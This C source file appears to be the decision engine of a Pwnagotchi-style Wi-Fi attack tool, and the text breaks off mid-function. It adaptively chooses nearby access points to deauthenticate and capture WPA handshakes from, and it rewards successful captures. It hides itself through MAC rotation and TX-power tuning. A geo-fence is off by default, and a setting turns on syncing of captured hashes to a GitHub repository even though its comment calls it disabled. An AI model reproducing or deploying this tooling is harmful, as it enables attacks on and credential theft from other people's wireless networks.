/**
 * brain.c - Pwnagotchi Brain/Automata State Machine Implementation
 *
 * Replaces Python pwnagotchi agent.py + automata.py + epoch.py
 * Designed for Raspberry Pi Zero W (ARMv6, 512MB RAM)
 *
 * NOW WITH THOMPSON SAMPLING:
 * - Binary Thompson Sampling for entity selection (explore vs exploit)
 * - Cost-aware scoring (success per cost, not just success)
 * - Entity lifecycle with decay + garbage collection
 * - EWMA + MAD signal tracking
 *
 * Target: <15% CPU (vs 56% for Python)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>  /* strcasecmp */
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <errno.h>
#include <dirent.h>

#include "brain.h"
#include "thompson_v3.h"
#include "pcapng_gps.h"
#include "pcap_check.h"
#include "hc22000.h"
#include "gps_refine.h"
#include "attack_log.h"
#include "channel_map.h"
#include "rssi_trend.h"
#include "model_inference.h"
#include "walking_mode.h"
#include "stationary_mode.h"
#include "driving_mode.h"
#include "ap_triage.h"
#include "firmware_health.h"
#include "eapol_monitor.h"

/* ============================================================================
 * Sprint 4: Mobility + RSSI Helpers
 * ========================================================================== */

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

/* Haversine distance between two GPS coordinates (in meters) */
static double haversine_distance(double lat1, double lon1, double lat2, double lon2) {
    double dlat = (lat2 - lat1) * M_PI / 180.0;
    double dlon = (lon2 - lon1) * M_PI / 180.0;
    double a = sin(dlat / 2.0) * sin(dlat / 2.0) +
               cos(lat1 * M_PI / 180.0) * cos(lat2 * M_PI / 180.0) *
               sin(dlon / 2.0) * sin(dlon / 2.0);
    double c = 2.0 * atan2(sqrt(a), sqrt(1.0 - a));
    return 6371000.0 * c;  /* Earth radius in meters */
}

/* Update mobility score based on GPS movement + AP churn.
 * Score: 0.0 = stationary (parked), 1.0 = fast movement (walking/driving)
 * Called once per epoch (~30s). */
/* Forward declaration for get_attack_tracker (defined later as static) */
static brain_attack_tracker_t *get_attack_tracker(brain_ctx_t *ctx, const char *mac);

/* Phase 1A Fix: EAPOL capture callback — fires when handshake completes.
 * Updates Thompson rewards so the brain learns which attacks work. */
static void brain_eapol_callback(const uint8_t *bssid,
                                  eapol_capture_type_t type,
                                  const eapol_quality_t *quality,
                                  void *user_data) {
    brain_ctx_t *ctx = (brain_ctx_t *)user_data;
    if (!ctx || !bssid) return;

    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    /* Reward Thompson sampling for this AP */
    ts_entity_t *entity = ts_get_or_create_entity(ctx->thompson, mac_str);
    if (entity) {
        float reward = (quality && quality->score > 50) ? 1.0f : 0.5f;
        ts_observe_outcome(entity, true, reward);
        fprintf(stderr, "[brain] [eapol-cb] %s captured (type=%d score=%d) -> Thompson rewarded\n",
                mac_str, (int)type, quality ? quality->score : 0);

        /* v3.0: Full observation update with reward shaping */
        if (ctx->v3) {
            int entity_idx = (int)(entity - ctx->thompson->entities);
            v3_reward_level_t rlevel = (quality && quality->score > 50)
                ? REWARD_HANDSHAKE : REWARD_EAPOL_PARTIAL;
            v3_observe(ctx->v3, ctx->thompson, entity, entity_idx,
                       rlevel, ctx->last_lat, ctx->last_lon);
        }
    }

    /* Record in channel map */
    brain_attack_tracker_t *tracker = get_attack_tracker(ctx, mac_str);
    if (tracker) {
        /* Reward the attack phase that led to this capture */
        int phase = tracker->last_attack_phase;
        if (phase >= 0 && phase < 8) {
            tracker->atk_alpha[phase] += 1.0f;
            fprintf(stderr, "[brain] [eapol-cb] Thompson phase %d rewarded for %s\n",
                    phase, mac_str);
        }
    }
}

static void update_mobility(brain_ctx_t *ctx) {
    time_t now = time(NULL);
    if (now - ctx->last_mobility_check < 2) return;  /* Check every 2s (GPS arrives at 1Hz) */
    ctx->last_mobility_check = now;

    float gps_component = 0.0f;
    float ap_component = 0.0f;

    /* GPS-based movement detection */
    if (ctx->gps && ctx->gps->has_fix && ctx->gps->latitude != 0.0) {
        if (ctx->last_lat != 0.0 && ctx->last_lon != 0.0) {
            double dist = haversine_distance(ctx->last_lat, ctx->last_lon,
                                             ctx->gps->latitude, ctx->gps->longitude);
            /* > 20m in 15s = moving; > 100m = fast movement */
            if (dist > 100.0) gps_component = 1.0f;
            else if (dist > 20.0) gps_component = (float)(dist - 20.0) / 80.0f;
            /* else stationary */
        }
        ctx->last_lat = ctx->gps->latitude;
        ctx->last_lon = ctx->gps->longitude;
    }

    /* AP churn detection (works without GPS).
     * NOTE: ap_delta = abs(count_now - count_prev) only detects COUNT changes,
     * not actual AP TURNOVER (where old APs leave and new ones arrive but total
     * stays the same). This is a known limitation; proper fix needs BSSID set
     * tracking. For now, we EMA-smooth the raw churn to prevent wild oscillation
     * that prevents hysteresis from ever triggering WALKING mode. */
    int ap_delta = abs(ctx->total_aps - ctx->last_ap_count);
    ctx->last_ap_count = ctx->total_aps;
    if (ap_delta >= 5) ap_component = 1.0f;
    else if (ap_delta >= 2) ap_component = (float)(ap_delta - 1) / 4.0f;

    /* Combined score with fast-tracking EMA (alpha=0.7 for input, instant GPS response) */
    float raw_score = fmaxf(gps_component, ap_component);
    ctx->mobility_score = ctx->mobility_score * 0.3f + raw_score * 0.7f;

    /* EMA-smoothed AP churn fraction for mobility_mode_update().
     * Raw per-epoch churn oscillates wildly (0.55 → 0.08 → 0.31) because
     * walking adds APs gradually, not all at once. Smoothing prevents the
     * hysteresis counter from resetting every other epoch. */
    {
        float raw_churn = (ctx->total_aps > 0) ? (float)ap_delta / (float)ctx->total_aps : 0.0f;
        if (raw_churn > 1.0f) raw_churn = 1.0f;
        ctx->smoothed_churn = 0.7f * raw_churn + 0.3f * ctx->smoothed_churn;
    }

    if (ctx->mobility_score > 0.3f) {
        fprintf(stderr, "[brain] [mobility] score=%.2f (gps=%.2f, ap_churn=%.2f, aps=%d)\n",
                ctx->mobility_score, gps_component, ap_component, ctx->total_aps);
    }

    /* Suppress mode detection for first few seconds after boot (churn from 0→N is misleading) */
    if (ctx->mobility_boot_skips > 0) {
        ctx->mobility_boot_skips--;
        fprintf(stderr, "[brain] [mobility-dbg] BOOT GRACE: skipping mode detection (%d left)\n", ctx->mobility_boot_skips);
        return;
    }

    /* Phase 1C: Feed data to mobility mode detector for DRV/WLK/STA switching.
     * GPS speed_kmh is the primary signal; mobility_score + ap_churn are fallbacks.
     * Accelerometer from phone is a tiebreaker when GPS Doppler reports 0. */
    float gps_speed_kmh = -1.0f;  /* -1 = no GPS; classify() uses >= 0 as "GPS present" */
    if (ctx->gps && ctx->gps->has_fix) {
        gps_speed_kmh = (float)ctx->gps->speed_kmh;
    }

    /* Read accelerometer + step count + speed from /tmp/gps.json
     * (written by bt_gps_receiver every ~2s from BT RFCOMM).
     * Accel/Steps come from Android SensorManager, not NMEA.
     * Speed from Android Location.getSpeed() is a fallback when NMEA has no fix.
     * NOTE: JSON position haversine was tried but REMOVED — GPS accuracy ~22m
     * means position jitter between 2 readings produces 30+ km/h phantom speed.
     * The gps.c haversine uses a 5-sample ring buffer which averages out jitter. */
    float phone_accel = 0.0f;
    int phone_steps = 0;
    float json_speed_kmh = -1.0f;
    char phone_activity[16] = {0};
    int phone_activity_conf = 0;
    float displacement_speed_ms = -1.0f;
    {
        FILE *gf = fopen("/tmp/gps.json", "r");
        if (gf) {
            char buf[512];
            size_t n = fread(buf, 1, sizeof(buf) - 1, gf);
            buf[n] = '\0';
            fclose(gf);
            /* Quick parse: find "Accel":, "Steps":, "Speed":, "Activity":, "ActivityConfidence": */
            const char *ap = strstr(buf, "\"Accel\":");
            if (ap) phone_accel = (float)atof(ap + 8);
            const char *sp = strstr(buf, "\"Steps\":");
            if (sp) phone_steps = atoi(sp + 8);

            /* Parse phone Activity Recognition results */
            const char *act = strstr(buf, "\"Activity\":");
            if (act) {
                const char *q1 = strchr(act + 11, '"');
                if (q1) {
                    q1++;
                    const char *q2 = strchr(q1, '"');
                    if (q2 && (q2 - q1) < 16) {
                        memcpy(phone_activity, q1, q2 - q1);
                        phone_activity[q2 - q1] = '\0';
                    }
                }
            }
            const char *actc = strstr(buf, "\"ActivityConfidence\":");
            if (actc) phone_activity_conf = atoi(actc + 21);

            /* Calibration ground truth from app ("STA", "WLK", "DRV", or absent) */
            const char *cal = strstr(buf, "\"Calibration\":");
            if (cal) {
                const char *cq1 = strchr(cal + 15, '"');
                if (cq1) {
                    cq1++;
                    const char *cq2 = strchr(cq1, '"');
                    if (cq2 && (cq2 - cq1) <= 4) {
                        char cal_mode[5] = {0};
                        memcpy(cal_mode, cq1, cq2 - cq1);
                        mobility_mode_set_calibration(&ctx->mobility_ctx, cal_mode);
                    }
                }
            } else {
                /* Field absent → clear stale calibration */
                mobility_mode_set_calibration(&ctx->mobility_ctx, "");
            }

            /* Displacement speed — calculated from GPS position changes by
             * the Android companion app. This is the ultimate fallback when
             * Samsung's sensor hub freezes the Doppler speed. */
            const char *dsp = strstr(buf, "\"DisplacementSpeed\":");
            if (dsp) displacement_speed_ms = (float)atof(dsp + 20);

            const char *upd = strstr(buf, "\"Updated\":");
            long now_ts = (long)time(NULL);
            bool json_fresh = false;
            if (upd) {
                long updated_ts = atol(upd + 10);
                json_fresh = ((now_ts - updated_ts) < 10);
            }

            /* Android Location.getSpeed() — fallback when NMEA has no fix */
            const char *spd = strstr(buf, "\"Speed\":");
            if (spd && json_fresh) {
                float v = (float)atof(spd + 8);
                json_speed_kmh = v * 3.6f;     /* m/s → km/h */
            }
        }
    }

    /* Speed source priority:
     * 1. Phone JSON Speed (Location.getSpeed() — Doppler-derived, accurate.
     *    This is what every speed app in the world uses.)
     * 2. NMEA speed (from gps.c — fallback only when phone JSON is stale)
     * 3. -1.0 = no GPS data available
     *
     * DisplacementSpeed REMOVED — it's calculated from GPS position changes
     * with ~15m accuracy, producing phantom 5-26 km/h while stationary.
     * Both NMEA Doppler and Android Location.getSpeed() correctly report 0. */
    if (json_speed_kmh >= 0.0f) {
        gps_speed_kmh = json_speed_kmh;  /* Phone speed is primary */
    }
    /* else: keep NMEA speed as fallback (better than nothing) */

    /* Use smoothed AP churn, not raw per-epoch delta.
     * Raw churn oscillates too wildly for hysteresis to work. */

    /* V2: Feed phone Activity Recognition to mobility detector BEFORE update.
     * When the phone sends a valid activity (e.g. IN_VEHICLE/WALKING/STILL),
     * it takes priority over raw GPS speed in classify(). */
    if (phone_activity[0]) {
        mobility_mode_set_activity(&ctx->mobility_ctx, phone_activity, phone_activity_conf);
    }

    if (mobility_mode_update(&ctx->mobility_ctx, gps_speed_kmh,
                             ctx->mobility_score, ctx->smoothed_churn, ctx->total_aps,
                             phone_accel, phone_steps)) {
        /* Mode changed — apply new parameters to brain config */
        const mobility_params_t *p = mobility_mode_get_params(&ctx->mobility_ctx);
        ctx->config.recon_time = p->recon_time;
        ctx->config.hop_recon_time = p->hop_recon_time;
        ctx->config.min_recon_time = p->min_recon_time;
        ctx->config.max_recon_time = p->max_recon_time;
        ctx->config.throttle_a = p->throttle_a;
        ctx->config.throttle_d = p->throttle_d;

        /* Wire deauth/associate enables to actual config gates.
         * Without this, config.deauth and config.associate stay true forever
         * (hardcoded defaults) even when driving mode sets them false. */
        ctx->config.deauth = p->deauth_enabled;
        ctx->config.associate = p->associate_enabled;

        /* Gate attack phases based on mobility mode */
        if (p->pmkid_only) {
            /* DRIVING: only PMKID (phase 0) and Passive (phase 7) */
            for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++)
                ctx->config.attack_phase_enabled[ph] = (ph == 0 || ph == 7);
        } else {
            /* WALKING/STATIONARY: all phases enabled */
            for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++)
                ctx->config.attack_phase_enabled[ph] = true;
        }

        fprintf(stderr, "[brain] [mobility] MODE APPLIED: %s recon=%d/%d throttle=%.1f/%.1f phases=%s deauth=%d assoc=%d\n",
                mobility_mode_name(ctx->mobility_ctx.current_mode),
                p->recon_time, p->hop_recon_time, p->throttle_a, p->throttle_d,
                p->pmkid_only ? "PMKID-ONLY" : "ALL",
                p->deauth_enabled, p->associate_enabled);

        /* Immediately update display mood to reflect new mobility mode.
         * Without this, the display only updates on the next epoch (30-70s).
         * Walking/driving detection should be visible within seconds. */
        if (ctx->on_mood_change) {
            brain_mood_t mob_mood;
            switch (ctx->mobility_ctx.current_mode) {
                case MOBILITY_DRIVING: mob_mood = MOOD_DRIVING; break;
                case MOBILITY_WALKING: mob_mood = MOOD_WALKING; break;
                default:               mob_mood = MOOD_SCANNING; break;
            }
            ctx->on_mood_change(mob_mood, ctx->callback_user_data);
        }

        /* Phase 2: Start/stop mode-specific pipeline sessions on transition */
        switch (ctx->mobility_ctx.current_mode) {
            case MOBILITY_DRIVING:
                walk_session_end(&ctx->walking);
                stat_session_end(&ctx->stationary);
                drv_session_start(&ctx->driving);
                break;
            case MOBILITY_WALKING:
                drv_session_end(&ctx->driving);
                stat_session_end(&ctx->stationary);
                walk_session_start(&ctx->walking);
                break;
            case MOBILITY_STATIONARY:
            default:
                drv_session_end(&ctx->driving);
                walk_session_end(&ctx->walking);
                stat_session_start(&ctx->stationary);
                break;
        }
    }

    /* Debug: always log mobility inputs AFTER update */
    fprintf(stderr, "[brain] [mobility-dbg] raw=%.1fkm/h accel=%.2f steps=%d act=%s(%d%%) score=%.2f churn=%.2f(s=%.2f delta=%d/aps=%d) mode=%s\n",
            gps_speed_kmh,
            phone_accel, phone_steps,
            phone_activity[0] ? phone_activity : "NONE", phone_activity_conf,
            ctx->mobility_score, 
            ctx->smoothed_churn,
            (ctx->total_aps > 0) ? (float)ap_delta / (float)ctx->total_aps : 0.0f,
            ap_delta, ctx->total_aps,
            mobility_mode_label(ctx->mobility_ctx.current_mode));
}

/* RSSI-proportional delay multiplier (#16).
 * Strong signal (-30 to -50 dBm) → 0.3x delay (fast attacks)
 * Medium signal (-50 to -70 dBm) → 1.0x delay (normal)
 * Weak signal  (-70 to -85 dBm) → 2.5x delay (slow, saves frames)
 * Returns multiplier applied to throttle_a / throttle_d */
static float rssi_delay_multiplier(int rssi) {
    if (rssi >= -50) return 0.3f;       /* Very strong */
    if (rssi >= -60) return 0.5f;       /* Strong */
    if (rssi >= -70) return 1.0f;       /* Normal */
    if (rssi >= -80) return 1.8f;       /* Weak */
    return 2.5f;                        /* Very weak */
}

/* Sprint 6 #14: Adapt TX power based on stealth level and target RSSI
 * - AGGRESSIVE level: max power
 * - MEDIUM level: random between min and max
 * - PASSIVE level: only what's needed (RSSI-proportional)
 * Returns the TX power in dBm that should be used */
static int adapt_tx_power(brain_ctx_t *ctx, int target_rssi) {
    int tx_min = ctx->config.tx_power_min;
    int tx_max = ctx->config.tx_power_max;

    stealth_level_t level = STEALTH_LEVEL_AGGRESSIVE;
    if (ctx->stealth) {
        level = stealth_get_level(ctx->stealth);
    }

    int power;
    switch (level) {
    case STEALTH_LEVEL_AGGRESSIVE:
        power = tx_max;
        break;
    case STEALTH_LEVEL_MEDIUM:
        /* Randomize within range, biased toward middle */
        power = tx_min + (rand() % (tx_max - tx_min + 1));
        break;
    case STEALTH_LEVEL_PASSIVE:
        /* Only use enough power to reach the target
         * RSSI of -40 dBm means AP is close -> low power needed
         * RSSI of -80 dBm means AP is far -> higher power needed */
        if (target_rssi > -50) {
            power = tx_min;         /* Very close, whisper */
        } else if (target_rssi > -65) {
            power = tx_min + (tx_max - tx_min) / 3;
        } else if (target_rssi > -75) {
            power = tx_min + 2 * (tx_max - tx_min) / 3;
        } else {
            power = tx_max;         /* Far away, need full power */
        }
        break;
    default:
        power = tx_max;
        break;
    }

    return power;
}

/* Sprint 6 #14: Apply TX power setting via iw command */
static void set_tx_power(brain_ctx_t *ctx, int power_dbm) {
    if (power_dbm == ctx->tx_power_current) return;  /* No change needed */

    /* Clamp */
    if (power_dbm < ctx->config.tx_power_min)
        power_dbm = ctx->config.tx_power_min;
    if (power_dbm > ctx->config.tx_power_max)
        power_dbm = ctx->config.tx_power_max;

    /* iw uses mBm (millidBm), so multiply by 100 */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "iw dev wlan0mon set txpower fixed %d 2>/dev/null",
             power_dbm * 100);

    /* Also tell bettercap */
    char bcap_cmd[64];
    snprintf(bcap_cmd, sizeof(bcap_cmd), "set wifi.txpower %d", power_dbm);
    bcap_send_command(ctx->bcap, bcap_cmd);

    ctx->tx_power_current = power_dbm;

    fprintf(stderr, "[brain] [stealth] TX power: %d dBm\n", power_dbm);
}

/* Sprint 6 #17: Check if current GPS position is inside geo-fence
 * Returns true if inside fence (or fence disabled) = attacks allowed
 * Returns false if outside fence = attacks suppressed */
static bool geo_fence_check(brain_ctx_t *ctx) {
    if (!ctx->config.geo_fence_enabled) return true;  /* No fence = allow all */

    if (!ctx->gps || !ctx->gps->has_fix) {
        /* No GPS fix: be conservative, allow attacks
         * (don't block operation when GPS is down) */
        return true;
    }

    double dist = haversine_distance(
        ctx->gps->latitude, ctx->gps->longitude,
        ctx->config.geo_fence_lat, ctx->config.geo_fence_lon
    );

    bool inside = (dist <= ctx->config.geo_fence_radius_m);

    if (!inside && ctx->geo_fence_active) {
        /* Was inside, now outside -- log transition */
        fprintf(stderr, "[brain] [geo-fence] LEFT fence (%.0fm from center, radius=%.0fm) -- attacks paused\n",
                dist, ctx->config.geo_fence_radius_m);
        ctx->geo_fence_active = false;
    } else if (inside && !ctx->geo_fence_active) {
        /* Was outside, now inside -- log transition */
        fprintf(stderr, "[brain] [geo-fence] ENTERED fence (%.0fm from center) -- attacks active\n", dist);
        ctx->geo_fence_active = true;
    }

    return inside;
}

/* Home mode REMOVED — replaced by automatic skip-after-capture system.
 * APs are attacked until a full handshake is captured, then automatically
 * skipped via the 3-layer check: pcap cache + EAPOL monitor + failure blacklist.
 * When all visible APs have been captured, the brain enters bored/idle state
 * naturally. Whitelist PSK data lives in stealth config for future auto-connect. */
#include "crack_manager.h"
#include "health_monitor.h"
#include <sys/stat.h>
/* thompson.h already included via brain.h */

/* Raw frame injection headers */
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <arpa/inet.h>  /* htons */

/* Monitor interface for raw frame injection */
#define RAW_INJECT_IFACE "wlan0mon"


/* Sprint 7 #21: Attack functions moved to brain_attacks.c */
#include "brain_attacks.h"

/* Sprint 7 #21: Handshake quality management moved to brain_handshake.c */
#include "brain_handshake.h"

/* ============================================================================
 * Attack Failure Blacklist
 * Tracks per-AP deauth counts. After BRAIN_BLACKLIST_THRESHOLD deauths with
 * no handshake, blacklist AP for BRAIN_BLACKLIST_TTL seconds to save CPU.
 * ========================================================================== */

/* Check if an AP is blacklisted (expired entries are auto-pruned) */
static bool brain_is_blacklisted(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    for (int i = 0; i < ctx->blacklist_count; i++) {
        if (strcmp(ctx->blacklist[i].mac, mac) == 0) {
            if ((now - ctx->blacklist[i].blacklisted_at) < BRAIN_BLACKLIST_TTL) {
                return true;  /* Still blacklisted */
            }
            /* Expired: remove by swapping with last */
            ctx->blacklist[i] = ctx->blacklist[--ctx->blacklist_count];
            return false;
        }
    }
    return false;
}

/* Record a deauth attempt against an AP. Returns true if AP just got blacklisted. */
static bool brain_track_deauth(brain_ctx_t *ctx, const char *mac) {
    /* Find existing tracker */
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcmp(ctx->attack_tracker[i].mac, mac) == 0) {
            ctx->attack_tracker[i].deauth_count++;
            if (!ctx->attack_tracker[i].got_handshake &&
                ctx->attack_tracker[i].deauth_count >= BRAIN_BLACKLIST_THRESHOLD) {
                /* Blacklist this AP */
                if (ctx->blacklist_count < BRAIN_BLACKLIST_MAX) {
                    strncpy(ctx->blacklist[ctx->blacklist_count].mac, mac, BRAIN_MAC_STR_LEN - 1);
                    ctx->blacklist[ctx->blacklist_count].blacklisted_at = time(NULL);
                    ctx->blacklist_count++;
                    fprintf(stderr, "[brain] [blacklist] %s blacklisted after %d failed deauths\n",
                            mac, ctx->attack_tracker[i].deauth_count);
                }
                /* Reset tracker so AP can be retried after TTL expires */
                ctx->attack_tracker[i] = ctx->attack_tracker[--ctx->attack_tracker_count];
                return true;
            }
            return false;
        }
    }
    /* New tracker entry */
    if (ctx->attack_tracker_count < BRAIN_BLACKLIST_MAX) {
        brain_attack_tracker_t *t = &ctx->attack_tracker[ctx->attack_tracker_count++];
        strncpy(t->mac, mac, BRAIN_MAC_STR_LEN - 1);
        t->deauth_count = 1;
        t->got_handshake = false;
        t->first_attack = time(NULL);
    }
    return false;
}

/* Mark AP as having yielded a handshake (prevents future blacklisting) */
static void brain_track_handshake(brain_ctx_t *ctx, const char *mac) {
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcmp(ctx->attack_tracker[i].mac, mac) == 0) {
            ctx->attack_tracker[i].got_handshake = true;
            return;
        }
    }
}

/* ============================================================================
 * Configuration Defaults
 * ========================================================================== */

brain_config_t brain_config_default(void) {
    brain_config_t config = {
        /* Timing */
        .recon_time         = 10,
        .min_recon_time     = 2,
        .max_recon_time     = 30,
        .hop_recon_time     = 5,
        .ap_ttl             = 120,
        .sta_ttl            = 300,
        
        /* Throttling */
        .throttle_a         = 0.2f,
        .throttle_d         = 0.3f,
        
        /* Epoch thresholds */
        .bored_num_epochs   = 15,
        .sad_num_epochs     = 25,
        .excited_num_epochs = 10,
        .max_misses_for_recon = 5,
        .mon_max_blind_epochs = 50,
        
        /* Features */
        .associate          = true,
        .deauth             = true,
        .filter_weak        = true,
        .min_rssi           = -75,
        
        /* Channels - NULL means all supported */
        .channels           = NULL,
        .num_channels       = 0,
        
        /* Bond system */
        .bond_encounters_factor = 100.0f,

        /* Home mode REMOVED — auto skip-after-capture handles idle detection */

    /* Sprint 8: Hash sync (disabled by default) */
    .sync_config = { .github_repo = "MrBumChinz/Hash-Den", .github_token = "", .contributor_name = "pwnagotchi",
                     .sync_interval = 21600, .enabled = true },       /* Must be reasonably close */

        /* Sprint 6: Stealth enhancements */
        .mac_rotation_enabled = true,
        .mac_rotation_interval = 1800,  /* 30 minutes */
        .tx_power_min = 5,
        .tx_power_max = 30,

        /* Sprint 6 #17: Geo-fencing (disabled by default) */
        .geo_fence_enabled = false,
        .geo_fence_lat = 0.0,
        .geo_fence_lon = 0.0,
        .geo_fence_radius_m = 0.0,

        /* Sprint 7 #18: All attack phases enabled by default */
        .attack_phase_enabled = { true, true, true, true, true, true, true, true },
    };
    return config;
}

/* ============================================================================
 * Utility Functions
 * ========================================================================== */

void mac_to_str(const mac_addr_t *mac, char *str) {
    snprintf(str, BRAIN_MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac->addr[0], mac->addr[1], mac->addr[2],
             mac->addr[3], mac->addr[4], mac->addr[5]);
}

int str_to_mac(const char *str, mac_addr_t *mac) {
    unsigned int bytes[6];
    if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) {
        mac->addr[i] = (uint8_t)bytes[i];
    }
    return 0;
}

static inline int64_t get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

/* ============================================================================
 * Epoch Management
 * ========================================================================== */

void brain_epoch_reset(brain_epoch_t *epoch) {
    epoch->did_deauth = false;
    epoch->did_associate = false;
    epoch->did_handshake = false;
    epoch->any_activity = false;
    epoch->num_deauths = 0;
    epoch->num_assocs = 0;
    epoch->num_shakes = 0;
    epoch->num_hops = 0;
    epoch->num_missed = 0;
    epoch->num_slept = 0;
    epoch->epoch_started = time(NULL);
}

void brain_epoch_track(brain_epoch_t *epoch, bool deauth, bool assoc,
                       bool handshake, bool hop, bool miss, int inc) {
    if (deauth) {
        epoch->num_deauths += inc;
        epoch->did_deauth = true;
        epoch->any_activity = true;
    }
    if (assoc) {
        epoch->num_assocs += inc;
        epoch->did_associate = true;
        epoch->any_activity = true;
    }
    if (handshake) {
        epoch->num_shakes += inc;
        epoch->did_handshake = true;
        epoch->any_activity = true;
    }
    if (hop) {
        epoch->num_hops += inc;
        /* Reset per-channel flags on hop */
        epoch->did_deauth = false;
        epoch->did_associate = false;
    }
    if (miss) {
        epoch->num_missed += inc;
    }
}

/* Sprint 7 #20: Adaptive epoch duration - scale channel dwell time */
static void adapt_epoch_timing(brain_ctx_t *ctx) {
    int ap_count = ctx->total_aps;

    /* AUDIT FIX: Try ML dwell time model first (trained on PC Brain data).
     * Model 4 uses AP density bucket + mobility mode + success rate. */
    int mobility_mode = 1;  /* default: stationary */
    if (ctx->mobility_score > 0.5f) {
        mobility_mode = 0;  /* driving */
    } else if (ctx->mobility_score > 0.2f) {
        mobility_mode = 2;  /* walking */
    }
    float success_rate = 0.0f;
    if (ctx->total_aps > 0) {
        success_rate = (float)ctx->epoch.num_shakes / (float)ctx->total_aps;
    }
    int ml_dwell = get_dwell_time(ap_count, mobility_mode, success_rate);
    int base_dwell;

    if (ml_dwell > 3 && ml_dwell != 30) {
        /* ML model returned a meaningful value (not the default 30 fallback).
         * Dwell table is in seconds already. */
        base_dwell = ml_dwell;
        if (base_dwell > 60) base_dwell = 60;
    } else {
        /* Fallback: heuristic (ML model not available or returned default) */
        base_dwell = 5;  /* default hop_recon_time */

        /* AP density scaling */
        if (ap_count > 20) {
            base_dwell = 2;       /* Dense area: cycle fast */
        } else if (ap_count > 10) {
            base_dwell = 3;       /* Moderate: slightly faster */
        } else if (ap_count > 5) {
            base_dwell = 5;       /* Normal */
        } else if (ap_count > 0) {
            base_dwell = 8;       /* Sparse: dwell longer */
        } else {
            base_dwell = 10;      /* No APs: listen hard */
        }

        /* Success rate: got handshakes? Strike while hot */
        if (ctx->epoch.num_shakes > 0) {
            base_dwell = (base_dwell * 2) / 3;  /* 33% faster if capturing */
        }

        /* Mobility: moving = scan faster */
        if (ctx->mobility_score > 0.5f) {
            base_dwell = base_dwell / 2;        /* Fast movement: halve dwell */
        } else if (ctx->mobility_score > 0.3f) {
            base_dwell = (base_dwell * 3) / 4;  /* Moderate movement: 25% faster */
        }

        /* Inactive streak: extend dwell for deeper listening */
        if (ctx->epoch.inactive_for > 10) {
            base_dwell += 3;     /* Very inactive: listen longer */
        } else if (ctx->epoch.inactive_for > 5) {
            base_dwell += 1;     /* Somewhat inactive */
        }
    }

    /* Clamp to configured bounds */
    if (base_dwell < ctx->config.min_recon_time) base_dwell = ctx->config.min_recon_time;
    if (base_dwell > ctx->config.max_recon_time) base_dwell = ctx->config.max_recon_time;

    /* Only log if changed */
    if (base_dwell != ctx->config.hop_recon_time) {
        fprintf(stderr, "[brain] [adaptive] dwell: %ds -> %ds (aps=%d shakes=%d mobility=%.1f inactive=%d)\n",
                ctx->config.hop_recon_time, base_dwell, ap_count,
                ctx->epoch.num_shakes, ctx->mobility_score, ctx->epoch.inactive_for);
        ctx->config.hop_recon_time = base_dwell;
    }
}

void brain_epoch_next(brain_ctx_t *ctx) {
    /* Invalidate per-epoch caches */
    ctx->bored_cache_valid = false;

    /* Sprint 7 #20: Adapt timing based on conditions */
    adapt_epoch_timing(ctx);

    brain_epoch_t *e = &ctx->epoch;
    
    /* Calculate epoch duration */
    time_t now = time(NULL);
    e->epoch_duration = (float)(now - e->epoch_started);
    
    /* Update consecutive counters */
    if (!e->any_activity && !e->did_handshake) {
        e->inactive_for++;
        e->active_for = 0;
    } else {
        e->active_for++;
        e->inactive_for = 0;
        e->sad_for = 0;
        e->bored_for = 0;
    }
    
    /* Mood state transitions based on inactivity */
    if (e->inactive_for >= ctx->config.sad_num_epochs) {
        e->bored_for = 0;
        e->sad_for++;
    } else if (e->inactive_for >= ctx->config.bored_num_epochs) {
        e->sad_for = 0;
        e->bored_for++;
    } else {
        e->sad_for = 0;
        e->bored_for = 0;
    }
    
    stealth_epoch_reset(ctx->stealth);

    /* Sprint 6 #15: MAC rotation at epoch boundary */
    if (ctx->stealth && stealth_should_rotate_mac(ctx->stealth)) {
        fprintf(stderr, "[brain] [stealth] rotating MAC address...\n");
        if (stealth_rotate_mac(ctx->stealth) == 0) {
            ctx->last_mac_rotation = time(NULL);
            fprintf(stderr, "[brain] [stealth] MAC rotated successfully\n");
        }
    }
    /* Fire epoch callback */
    fprintf(stderr, "[brain] on_epoch=%p\n", (void*)ctx->on_epoch);
    if (ctx->on_epoch) {
        fprintf(stderr, "[brain] calling on_epoch callback\n");
        ctx->on_epoch(e->epoch_num, e, ctx->callback_user_data);
    }
    
    /* Log epoch summary */
    fprintf(stderr, "[brain] epoch %d: duration=%.0fs inactive=%d active=%d "
            "deauths=%d assocs=%d shakes=%d hops=%d\n",
            e->epoch_num, e->epoch_duration, e->inactive_for, e->active_for,
            e->num_deauths, e->num_assocs, e->num_shakes, e->num_hops);
    
    /* Save Thompson state every 10 epochs for crash resilience */
    if (ctx->thompson && (e->epoch_num % 10) == 0 && e->epoch_num > 0) {
        ts_save_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");
        fprintf(stderr, "[brain] Thompson state saved (epoch %d)\n", e->epoch_num);
    }

    /* v3.0: Save v3 binary state + export JSON for PC sync every 10 epochs */
    if (ctx->v3 && (e->epoch_num % 10) == 0 && e->epoch_num > 0) {
        v3_save_state(ctx->v3, "/var/lib/pwnagotchi/v3_brain.bin");
        v3_state_export_json(ctx->v3, ctx->thompson,
                             "/var/lib/pwnagotchi/v3_export.json");
